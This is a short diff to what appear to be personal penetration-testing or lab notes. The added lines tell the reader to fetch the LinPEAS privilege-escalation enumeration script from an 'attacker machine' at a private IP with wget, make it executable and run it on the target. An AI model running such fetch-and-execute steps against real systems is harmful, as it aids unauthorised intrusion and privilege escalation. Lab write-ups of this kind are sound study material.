@@ -146,3 +146,15 @@ https://github.com/peass-ng/PEASS-ng/releases/tag/20260201-2ddf3a96
 
 ![[Pasted image 20260210004509.png]]
 
+Download the file from attacker machine :
+```
+wget 192.168.209.139/linpeas.sh
+```
+
+
+```
+chmod +x linpeas.sh 
+./linpeas.sh 
+```
+
+![[Pasted image 20260210004837.png]]
